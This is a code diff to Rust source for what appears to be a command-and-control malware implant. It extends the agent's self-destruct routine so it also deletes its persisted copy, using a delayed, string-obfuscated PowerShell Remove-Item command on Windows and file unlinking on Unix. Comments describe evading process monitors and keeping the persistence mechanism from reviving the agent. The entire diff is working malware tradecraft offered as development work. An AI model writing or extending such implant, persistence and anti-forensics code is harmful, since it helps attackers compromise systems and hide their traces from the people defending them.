@@ -510,6 +510,12 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
 /// Securely removes the agent from the disk and exits.
 pub fn self_destruct() -> ! {
     let current_exe = std::env::current_exe().unwrap_or_default();
+
+    // The persisted (stable) copy lives at the platform's stable-drop path
+    // and may differ from current_exe - delete it too, or the persistence
+    // mechanism would resurrect the agent from the stable copy.
+    let stable = crate::agent::persistence::current_stable_path()
+        .filter(|s| std::path::Path::new(s) != current_exe);
     
     // No output - avoid leaking intent to process monitors
     #[cfg(target_os = "windows")]
@@ -521,7 +527,16 @@ pub fn self_destruct() -> ! {
         // and execute arbitrary PowerShell commands. Doubling single quotes
         // ('') is PowerShell's escape mechanism inside single-quoted strings.
         let path = current_exe.to_string_lossy().replace('\'', "''");
-        let cmd = format!("{} '{}' {}", aes_str!("Start-Sleep -Seconds 3; Remove-Item -Path"), path, aes_str!("-Force"));
+        let cmd = match &stable {
+            Some(s) => format!(
+                "{} '{}','{}' {}",
+                aes_str!("Start-Sleep -Seconds 3; Remove-Item -Path"),
+                path,
+                s.replace('\'', "''"),
+                aes_str!("-Force")
+            ),
+            None => format!("{} '{}' {}", aes_str!("Start-Sleep -Seconds 3; Remove-Item -Path"), path, aes_str!("-Force")),
+        };
         
         let _ = spawn_shell(&cmd);
     }
@@ -529,7 +544,11 @@ pub fn self_destruct() -> ! {
     #[cfg(not(target_os = "windows"))]
     {
         // Linux/Unix: We can simply unlink the file (inode) while it is running.
-        let _ = std::fs::remove_file(current_exe);
+        let _ = std::fs::remove_file(&current_exe);
+        // Also unlink the stable copy if it lives at a different path.
+        if let Some(s) = &stable {
+            let _ = std::fs::remove_file(s);
+        }
     }
 
     // Hard Exit
